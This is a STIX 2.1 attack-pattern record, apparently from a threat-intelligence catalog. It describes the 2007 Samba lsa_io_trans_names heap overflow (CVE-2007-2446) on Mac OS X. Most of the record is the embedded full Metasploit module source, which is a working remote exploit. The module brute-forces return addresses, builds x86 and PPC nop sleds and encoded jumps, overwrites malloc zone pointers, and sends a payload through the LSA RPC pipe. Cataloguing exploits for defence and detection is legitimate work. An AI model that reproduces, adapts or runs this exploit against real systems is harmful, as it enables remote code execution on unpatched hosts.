{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f9ab222-c7ec-4379-82e4-90c4257b9a31",
    "created": "2024-08-14T16:34:13.829991Z",
    "modified": "2024-08-14T16:34:13.829994Z",
    "name": "Samba lsa_io_trans_names Heap Overflow",
    "description": " This module triggers a heap overflow in the LSA RPC service of the Samba daemon. This module uses the szone_free() to overwrite the size() or free() pointer in initial_malloc_zones structure. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/samba/lsa_transnames_heap.rb",
            "external_id": "lsa_transnames_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2446"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba lsa_io_trans_names Heap Overflow',\n      'Description'    => %q{\n        This module triggers a heap overflow in the LSA RPC service\n      of the Samba daemon. This module uses the szone_free() to overwrite\n      the size() or free() pointer in initial_malloc_zones structure.\n      },\n      'Author'         =>\n        [\n          'Ramon de C Valle',\n          'Adriano Lima <adriano[at]risesecurity.org>',\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-2446'],\n          ['OSVDB', '34699'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n        },\n      'Platform'       => 'osx',\n      'DefaultOptions' =>\n        {\n          'PrependSetresuid' => true,\n        },\n      'Targets'        =>\n        [\n          ['Mac OS X 10.4.x x86 Samba 3.0.10',\n          {\n            'Platform'      => 'osx',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 4 * 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x01818000 },\n                'Stop'  => { 'Ret' => 0x01830000 },\n                'Step'  => 3351,\n              },\n          }\n          ],\n          ['Mac OS X 10.4.x PPC Samba 3.0.10',\n          {\n            'Platform'      => 'osx',\n            'Arch'          => [ ARCH_PPC ],\n            'Nops'          => 1600,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0x01813000 },\n                'Stop'  => { 'Ret' => 0x01830000 },\n                'Step'  => 796,\n              }\n          }\n          ],\n          ['DEBUG',\n          {\n            'Platform'      => 'osx',\n            'Arch'          => [ ARCH_X86 ],\n            'Nops'          => 4 * 1024,\n            'Bruteforce' =>\n              {\n                'Start' => { 'Ret' => 0xaabbccdd },\n                'Stop'  => { 'Ret' => 0xaabbccdd },\n                'Step'  => 0,\n              }\n          }\n          ],\n        ],\n      'DisclosureDate' => '2007-05-14'\n      ))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use\", 'LSARPC']),\n      ])\n\n  end\n\n  # Handle a strange byteswapping issue on PPC\n  def ppc_byteswap(addr)\n    data = [addr].pack('N')\n    (data[1,1] + data[0,1] + data[3,1] + data[2,1]).unpack('N')[0]\n  end\n\n  def brute_exploit(target_addrs)\n\n    if(not @nops)\n      if (target['Nops'] > 0)\n        print_status(\"Creating nop sled....\")\n        @nops = make_nops(target['Nops'])\n      else\n        @nops = ''\n      end\n    end\n\n    print_status(\"Trying to exploit Samba with address 0x%.8x...\" % target_addrs['Ret'])\n\n    pipe = datastore['SMBPIPE'].downcase\n\n    print_status(\"Connecting to the SMB service...\")\n    connect()\n    smb_login()\n\n    datastore['DCERPC::fake_bind_multi'] = false\n\n    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    num_entries  = 256\n    num_entries2 = 257\n\n    #\n    # First talloc_chunk\n    # 16 bits align\n    # 16 bits sid_name_use\n    #     16 bits uni_str_len\n    #     16 bits uni_max_len\n    #     32 bits buffer\n    # 32 bits domain_idx\n    #\n    buf = (('A' * 16) * num_entries)\n\n    # Padding\n    buf << 'A' * 4\n\n    #\n    # Use the szone_free() to overwrite the size() pointer in\n    # initial_malloc_zones structure.\n    #\n    size_pointer = 0x1800008\n\n    # Initial nops array\n    nops = ''\n\n    # x86\n    if (target.arch.include?(ARCH_X86))\n\n      #\n      # We don't use the size() pointer anymore because it\n      # results in a unexpected behavior when smbd process\n      # is started by launchd.\n      #\n      free_pointer = 0x1800018\n      nop = \"\\x16\"\n\n      #\n      # First talloc_chunk\n      # 16 bits align\n      # 16 bits sid_name_use\n      #     16 bits uni_str_len\n      #     16 bits uni_max_len\n      #     32 bits buffer\n      # 32 bits domain_idx\n      #\n\n      # First nop block\n      buf = ((nop * 16) * num_entries)\n\n      #\n      # A nop block of 0x16 (pushl %ss) and the address of\n      # 0x1800014 results in a jns instruction which when\n      # executed will jump over the address written eight\n      # bytes past our target address by szone_free() (the\n      # sign flag is zero at the moment our target address is\n      # executed).\n      #\n      # 0x357b ^ ( 0x1800014 ^ 0x16161616 ) = 0x17962379\n      #\n      # This is the output of the sequence of xor operations\n      #   0:   79 23                   jns    0x25\n      #   2:   96                      xchgl  %eax,%esi\n      #   3:   17                      popl   %ss\n      #   4:   16                      pushl  %ss\n      #   5:   16                      pushl  %ss\n      #   6:   16                      pushl  %ss\n      #   7:   16                      pushl  %ss\n      #   8:   14 00                   adcb   $0x0,%al\n      #   a:   80 01 16                addb   $0x16,(%ecx)\n      #\n      # This jump is needed because the ecx register does not\n      # point to a valid memory location in free() context\n      # (it is zero).\n      #\n      # The jump will hit our nop block which will be executed\n      # until it reaches the payload.\n      #\n\n      # Padding nops\n      buf << nop * 2\n\n      # Jump over the pointers\n      buf << \"\\xeb\\x08\"\n\n      # Pointers\n      buf << [target_addrs['Ret']].pack('V')\n      buf << [free_pointer - 4].pack('V')\n\n      #\n      # We expect to hit this nop block or the one before\n      # the pointers.\n      #\n      buf << nop * (3852 - 8 - payload.encoded.length)\n\n      # Payload\n      buf << payload.encoded\n\n      # Padding nops\n      buf << nop * 1024\n\n      stub = lsa_open_policy(dcerpc)\n\n      stub << NDR.long(0)            # num_entries\n      stub << NDR.long(0)            # ptr_sid_enum\n      stub << NDR.long(num_entries)  # num_entries\n      stub << NDR.long(0x20004)      # ptr_trans_names\n      stub << NDR.long(num_entries2) # num_entries2\n      stub << buf\n\n    # PPC\n    else\n\n      #\n      #  The first half of the nop sled is an XOR encoded branch\n      #  instruction. The second half is a series of unencoded nop\n      #  instructions. The result is:\n      #\n      #  > This is the decoded branch instruction\n      #  0x181c380:      bl      0x181c6a0\n      #\n      #  > The size pointer is written below this\n      #  0x181c384:      .long 0x1800004\n      #\n      #  > Followed by the encoded branch sled\n      #  0x181c388:      ba      0x180365c\n      #  [ ... ]\n      #\n      #  > The branch lands in the normal nop sled\n      #  0x181c6a0:      andi.   r17,r16,58162\n      #  [ ... ]\n      #\n      #  > Finally we reach our payload :-)\n      #\n\n      size_pointer = size_pointer - 4\n\n      sled = target['Nops']\n      jump = [ 0x357b ^ ( size_pointer ^ (0x48000001 + sled / 2 )) ].pack('N')\n      nops = (jump * (sled / 8)) + @nops[0, sled / 8]\n\n      addr_size = ppc_byteswap(size_pointer)\n      addr_ret  = ppc_byteswap(target_addrs['Ret'])\n\n      # This oddness is required for PPC\n      buf << [addr_size].pack('N')\n      buf << [addr_ret ].pack('N')[2,2]\n      buf << [addr_ret ].pack('N')\n\n      # Padding\n      buf << \"A\" * (256 - 10)\n\n      stub = lsa_open_policy(dcerpc)\n\n      stub << NDR.long(0)            # num_entries\n      stub << NDR.long(0)            # ptr_sid_enum\n      stub << NDR.long(num_entries)  # num_entries\n      stub << NDR.long(0x20004)      # ptr_trans_names\n      stub << NDR.long(num_entries2) # num_entries2\n      stub << buf\n      stub << nops\n      stub << payload.encoded\n    end\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      # LsarLookupSids\n      dcerpc.call(0x0f, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError\n      print_status('Server did not respond, this is expected')\n    rescue Rex::Proto::DCERPC::Exceptions::Fault\n      print_error('Server is most likely patched...')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_status('Server disconnected, this is expected')\n      else\n        print_error(\"Error: #{e.class}: #{e}\")\n      end\n    end\n\n    handler\n    disconnect\n  end\n\n  def lsa_open_policy(dcerpc, server=\"\\\\\")\n\n    stubdata =\n      # Server\n      NDR.uwstring(server) +\n      # Object Attributes\n        NDR.long(24) + # SIZE\n        NDR.long(0)  + # LSPTR\n        NDR.long(0)  + # NAME\n        NDR.long(0)  + # ATTRS\n        NDR.long(0)  + # SEC DES\n          # LSA QOS PTR\n          NDR.long(1)  + # Referent\n          NDR.long(12) + # Length\n          NDR.long(2)  + # Impersonation\n          NDR.long(1)  + # Context Tracking\n          NDR.long(0)  + # Effective Only\n      # Access Mask\n      NDR.long(0x02000000)\n\n    res = dcerpc.call(6, stubdata)\n\n    dcerpc.last_response.stub_data[0,20]\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-14",
    "x_mitre_platforms": [
        "osx'"
    ]
}